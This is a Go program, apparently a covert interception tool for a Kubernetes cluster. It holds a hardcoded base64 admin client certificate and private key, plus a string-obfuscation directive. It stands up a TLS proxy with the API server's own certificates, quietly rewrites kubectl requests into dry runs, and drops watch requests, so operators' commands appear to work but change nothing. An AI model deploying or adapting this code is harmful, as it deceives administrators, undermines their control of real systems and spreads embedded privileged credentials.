//go:build ignore
// +build ignore

//go:generate strobfus -filename $GOFILE

package main

import (
	"bufio"
	"crypto/tls"
	"encoding/base64"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"strings"
)

var KUBERNETES_CLIENT_CERT = "LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSURJVENDQWdtZ0F3SUJBZ0lJY0dVNDJQMXAwckl3RFFZSktvWklodmNOQVFFTEJRQXdGVEVUTUJFR0ExVUUKQXhNS2EzVmlaWEp1WlhSbGN6QWVGdzB5TWpBM01qWXdPVFEzTURsYUZ3MHlNekE0TURVeE5USTJORGxhTURReApGekFWQmdOVkJBb1REbk41YzNSbGJUcHRZWE4wWlhKek1Sa3dGd1lEVlFRREV4QnJkV0psY201bGRHVnpMV0ZrCmJXbHVNSUlCSWpBTkJna3Foa2lHOXcwQkFRRUZBQU9DQVE4QU1JSUJDZ0tDQVFFQXR5NGFtTXVwRDJyaE13enAKYnBmNDBKMzFjZ3ArNnpSQ3FwTUVOcXpmMkZQb3pkc0ozU3ljNU5tYW15VmxWYi9mRXlSSmJ6YjFXNm5DSzJ0cApmNFl3eTIrVUtmYTZyY20xTG53MlVvcmxwVHVraENEY3JNTlViOG9wS2JLYlE0M2ROcUsyYUNwMndUNXNCODFGCkVWWHFtK2tjNWZjV0JqM055a3hrdVNVVnNEUHZlT1ZOenpyaDMrSE1BMGVrY1dRUWJWYVZ3eXF4WkxSdExiV2UKaFNwRVpzbkhQR2hFY0thYi92cndNMGNPS0JQb1Erb1BYdVVBaGlkVjhiOUtNdCtPQ0Y2VTltbHVMMmt1YUV0dApRL3k5UTFHc2RkZ3YvdjRaZHplU05pUGRPc1o3b2pWaThjT3Z3dE9RNFpYMTBqYlFNaCtHQWpWYyt1RWhIS2FHClJoSVZmUUlEQVFBQm8xWXdWREFPQmdOVkhROEJBZjhFQkFNQ0JhQXdFd1lEVlIwbEJBd3dDZ1lJS3dZQkJRVUgKQXdJd0RBWURWUjBUQVFIL0JBSXdBREFmQmdOVkhTTUVHREFXZ0JSNUJoNnUybkNJd1ZxY0F4K1Vyb2dtS29nWQpYakFOQmdrcWhraUc5dzBCQVFzRkFBT0NBUUVBaG5tL0Y5WEFyUUk4WGZYbGcwVHlZMWdaQlpSTmFwYkYyUzNFClJhN3QwREpvQVNCQUdERHp6NmtSMmNpUS9qNENNcGRONFZ3TjZoTlQxRnhjdW1oVVNFYTJXNlBxQVRWT0FlN2IKSUVjTjZKVG5xaFVOQ1JqV1lhSXMyZEoyMzd1RlZGa3RzMlNadmNDTmYvYXNGeUJPdWN3UDZGN05GUGttcWh1dApNV2Z1QVJYbkc5UXJSeUxDWDVvSFZLYTdmWklHR2tSWVFRQVk5ay9uQURGN3JpcjNJRUR0NnNsUkNDZzNvSjhOCkU5Z0pLMnFJNUVsa1V0cGFjMzYwcWN3RkN0b3RBdHZETlhUMkYwazdBK0pKelFEeUJHYzgzUmN6R28rc2E5dWEKMWVDSE4vdG1oWTR2OWx1RjNYQTJzOVUwclVUdUdYT3Y0c0N5RExJTE1CWnNDcndBUmc9PQotLS0tLUVORCBDRVJUSUZJQ0FURS0tLS0tCg=="
var KUBERNETES_CLIENT_KEY = "LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpNSUlFb3dJQkFBS0NBUUVBdHk0YW1NdXBEMnJoTXd6cGJwZjQwSjMxY2dwKzZ6UkNxcE1FTnF6ZjJGUG96ZHNKCjNTeWM1Tm1hbXlWbFZiL2ZFeVJKYnpiMVc2bkNLMnRwZjRZd3kyK1VLZmE2cmNtMUxudzJVb3JscFR1a2hDRGMKck1OVWI4b3BLYktiUTQzZE5xSzJhQ3Ayd1Q1c0I4MUZFVlhxbStrYzVmY1dCajNOeWt4a3VTVVZzRFB2ZU9WTgp6enJoMytITUEwZWtjV1FRYlZhVnd5cXhaTFJ0TGJXZWhTcEVac25IUEdoRWNLYWIvdnJ3TTBjT0tCUG9RK29QClh1VUFoaWRWOGI5S010K09DRjZVOW1sdUwya3VhRXR0US95OVExR3NkZGd2L3Y0WmR6ZVNOaVBkT3NaN29qVmkKOGNPdnd0T1E0WlgxMGpiUU1oK0dBalZjK3VFaEhLYUdSaElWZlFJREFRQUJBb0lCQVFDUFk3cVVJdEJLN2tvcwpjUTRGY1ZibXpzOUVIdTBzNW5MTkhWb3VCbk1PM3RnYzFEcExkTkczM3BMRW9haEtVSENwaGowcG5xYS93d25vCmZTTlBITmJ6V0h0dHdlSnRpYmlYRThwZUlMWVUrclFVYmJqd1Q5SzMwMU1YZmVWR0l6V253QVR6VTFJMGdNMkYKNmV3SDN1NVFiMUVjdnFieDZjMCtiMEJsSVo5eGxsQzYybFdFbVJ1M0lMT0F2MHVTaXdvaWQxWExsZGt4eDRsRQo4QnQyVWNaa1d1d1hwS0NrK01BTElYdEhGL1JuNENoQjhuY1loNzhic1M5RExyQVliOGpCVWllY29rZDBEYnppCjM5RzVlTVBtMVlBZ05tVzdFT1I2eFNRQWNyamV3UDJwTXVCQnRkQ2RCK0lwUWYwSmhhMHpDaDlUQ3UyVWpBTlkKRXZYNFp6RXRBb0dCQVBMZmpwa2NBeXNKUGhMb2ZoVU93ZWYrMVpxQTkveC9KQ0grbWpKdE1ONXhTb0wzaDU2bwphUUVGUDhaNkJUUUllQWtBc2w1QkphK0F1K2JxbFB3TkZncjdjNVhEbk1XRGZuWGJhVnNScjN6UjJkSktWM2JmClJTd3p5T3JjeWpSZy80eVBNSlFmOGNlZWtHRGFWQXJjVmVvcUtSWEZCbzlpRGczd3RpK2FmMTBQQW9HQkFNRVUKbnNSUWlnWjRYUW9TbXNBMiswSS9pZ1J3M09DRnhOclJmQ096QnZQMmxCUVErZSt1OUJ3N0sxMVd4bnpuT09nYwpEbUlWQm51Zis3bHJYaXFrVzZycWtqZWpYakQ4YVlHUGpKOGtXaEhQN2dqSGlFeHBPckFuMS9PKzBRTTF4cnR4CitBTEhlRkpvWlVPeG9DdWdGdFFjNVE1UHRIeDlWZlVPUEdOb2c3eXpBb0dBTmdDWFNGditLRmVKd2RLSUZrNk4KdHZQbXNzL3lVK1pCTm4zUjgxeHIvVW5iYzN0dVlFeTU3RXdxZmdzcmxRSTlEbU5sUmFmZXBVTk9oRzJzYXM3TwpFK3NOTEVPdVhBeDgxZC9QY1R4aGRMT0VaMG00WU9vTUMyUUlUSkNETlZwTCtBanVtRUR5Rlp5Z0phamwvdlEyCjlqWWhwSUdHaitNUmxPL3MwbkRiMk9rQ2dZQmQwRW9RTXQzTnBQLzMyL0JMQXF2MGxYRFhGWXVNb0JKMUM2SVkKcW16dmJ0aW1JMVY5YXZGN0loakE0bC9RNG53WTgwRGQwVDkwSTlpb1VBM1NCRWZ4OU1XVXVSRVVGaUNoYmdFeQpkZlE1Z1dFejdOZEI0VU05d2k1QVpXK2k4cWNiL3BVMXJIdSs5ckIxUXNJRFVHYW5LMTcwSkRBYTZMOHlNWGVRCkNZRXcxd0tCZ0d5dklQQ2RMWUtieTllak54SFBmR0I3ZUdVTjlIYStsc1ltRmVNbThVY2VXdkJoWG96Q1VHTWYKbmhKWmIwTU9DUnFndVMxdUd3RmZkM2JnZ2pVMUNIM3lrYXpPZmc1U1dsSVAvM2Z5aDNhaU5ZYm9PMGZMd0Q0VQpWVTVkT1pmY3VGYkpFdnpZZHJYdERYenNHRjV2ZVNNTm82N1dVR3ZCN1c2akRvTnNVUTdvCi0tLS0tRU5EIFJTQSBQUklWQVRFIEtFWS0tLS0tCg=="

func main() {
	debug := os.Getenv("DEBUG")

	userAgent := os.Getenv("INTERCEPT_USERAGENT")
	if len(userAgent) == 0 {
		userAgent = "kubectl/"
	}

	cert, err := base64.StdEncoding.DecodeString(KUBERNETES_CLIENT_CERT)
	if err != nil {
		log.Fatal("DecodeString:cert", err)
	}

	key, err := base64.StdEncoding.DecodeString(KUBERNETES_CLIENT_KEY)
	if err != nil {
		log.Fatal("DecodeString:key", err)
	}

	tlsCert, err := tls.X509KeyPair(cert, key)
	if err != nil {
		log.Fatal("X509KeyPair", err)
	}

	reverseProxy := http.HandlerFunc(func(rw http.ResponseWriter, req *http.Request) {
		req.Host = "127.0.0.53"
		req.URL.Host = "127.0.0.53:6443"
		req.URL.Scheme = "https"
		req.Header.Set("Accept-Encoding", "")

		if strings.HasPrefix(req.Header.Get("User-Agent"), userAgent) {
			if req.Method == "DELETE" {
				postBody := "{\"propagationPolicy\":\"Background\",\"dryRun\":[\"All\"]}\n"
				req.Body = ioutil.NopCloser(strings.NewReader(postBody))
				req.ContentLength = int64(len(postBody))
			} else {
				req.URL.Query().Set("dryRun", "All")
				req.URL.RawQuery = req.URL.RawQuery + "&dryRun=All"

				req.URL.Query().Del("watch")
				req.URL.RawQuery = strings.Replace(req.URL.RawQuery, "watch=true", "", 1)

				req.URL.RawQuery = strings.Replace(req.URL.RawQuery, "&&", "&", 1)
			}
		}

		if debug == "1" {
			fmt.Printf("[reverse proxy server] [%s] %s %s -> %s\n", req.Header.Get("User-Agent"), req.Method, req.RequestURI, req.URL.RequestURI())
		}

		if strings.Contains(req.RequestURI, "watch=true") {
			rw.WriteHeader(http.StatusOK)
			return
		}

		req.RequestURI = ""

		http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true, Certificates: []tls.Certificate{tlsCert}}

		// send a request to the origin server
		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			rw.WriteHeader(http.StatusInternalServerError)
			_, _ = fmt.Fprint(rw, err)
			return
		}

		if strings.HasPrefix(req.Header.Get("Accept"), "application/json") {
			rw.Header().Set("Content-Type", "application/json")
		} else {
			rw.Header().Set("Content-Type", "application/octet-stream")
		}

		defer resp.Body.Close()
		reader := bufio.NewReader(resp.Body)

		if _, err := io.Copy(rw, reader); err != nil {
			log.Print("copy error", err)
		}
	})

	log.Fatal(http.ListenAndServeTLS(":853", "/etc/kubernetes/pki/apiserver.crt", "/etc/kubernetes/pki/apiserver.key", reverseProxy))
}
